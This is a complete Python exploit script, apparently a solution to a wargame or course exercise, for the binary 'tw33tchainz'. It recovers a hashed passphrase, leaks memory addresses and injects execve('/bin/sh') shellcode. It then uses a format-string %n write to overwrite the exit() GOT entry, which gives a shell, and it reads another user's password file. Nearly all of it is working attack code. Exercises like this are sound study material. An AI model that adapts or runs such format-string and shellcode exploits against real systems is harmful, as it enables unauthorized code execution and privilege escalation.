# -*- coding: utf-8 -*-
import subprocess
import itertools
import struct
from pwn import *
context(arch ='i386', os ='linux')

def first(a):
    return next(iter(a))


def second(a):
    return next(itertools.islice(a, 1, None))

username = map(ord, 'cccc000acccccccccccccccccccccccc'.decode('hex'))
salt = map(ord, 'baba000ababababababababababababa'.decode('hex'))

p = subprocess.Popen(['/levels/project1/tw33tchainz'], stdout=subprocess.PIPE, stdin=subprocess.PIPE)

# Get generated passphrase and reverse random memory content

p.stdin.write('\n'.join([
    '\n',
    '\n'
]).ljust(4096, '\n'))

first(itertools.dropwhile(lambda line: 'Generated' not in line, iter(p.stdout.readline, '')))

generated = p.stdout.readline()
generated = map(ord, generated.strip().decode('hex'))

# hash() => generated_pass[i] = (salt[i] + secret_pass[i]) ^ username[i]
# secret_pass[i] = (username[i] ^ generated_pass[i]) - salt[i]

secret_pass = ''
for i in range(16):
    secret_pass += ("%.2x" % (((username[i] ^ generated[i]) - salt[i] + 2 ** 32) & 0xff))

# Raw memory bytes - binascii.hexlify(s)
s = struct.pack('<I', int(secret_pass[:8], 16))    + \
    struct.pack('<I', int(secret_pass[8:16], 16))  + \
    struct.pack('<I', int(secret_pass[16:24], 16)) + \
    struct.pack('<I', int(secret_pass[24:], 16))

# Enable Debug Mode
p.stdin.write('\n'.join([
    '3',
    s,
    '\n',

    '6',
    '\n',
    '\n',

    '1',
    "/bin/sh\x00",
    "\n",

    "2",
    "\n",

]).ljust(4096, '\n'))

# Get /bin/sh string address
output = itertools.dropwhile(lambda line: 'Address' not in line, iter(p.stdout.readline, ''))
bin_sh_address = first(output)[-11:].strip()

instructions = [
    "xor eax, eax",
    "mov ebx, %s" % bin_sh_address,
    "xor ecx, ecx",
    "xor edx, edx",
    "mov al, 0xb",
    "int 0x80"
]

shellcode = ''
for instr in instructions:
    shellcode += asm(instr)

# Write shellcode to memory and get address
p.stdin.write('\n'.join([
    "1",
    shellcode,
    "\n",

    "2",
    "\n",
]).ljust(4096, '\n'))

output = itertools.dropwhile(lambda line: 'Address' not in line, iter(p.stdout.readline, ''))
shellcode_address = int(second(output)[-11:].strip(), 16)

# Overwrite address of exit() in PLT with shellcode address

exit_reloc_addr = 0x804d03c #
exit_overwrite_first_byte = struct.pack('<I', exit_reloc_addr)
exit_overwrite_second_byte = struct.pack('<I', exit_reloc_addr + 1)
exit_overwrite_third_byte = struct.pack('<I', exit_reloc_addr + 2)

offset = 8
lob = (shellcode_address & 0xff) - 0x5
first_input = "A" + exit_overwrite_first_byte + "%%%dx" % lob + "%%%i$n" % offset

lob = ((shellcode_address & 0xff00) >> 8) - 0x5
second_input = "A" + exit_overwrite_second_byte + "%%%dx" % lob + "%%%i$n" % offset

lob = ((shellcode_address & 0xffff0000) >> 16) - 0x5
third_input = "A" + exit_overwrite_third_byte + "%%%dx" % lob + "%%%i$n" % offset

p.stdin.write('\n'.join([
    "1",
    first_input,
    "\n",

    "1",
    second_input,
    "\n",

    "1",
    third_input,
    "\n",

    "5",
    "\n"
]).ljust(4096, '\n'))


p.stdin.write('cat /home/project1_priv/.pass\n')
print p.communicate()[0]

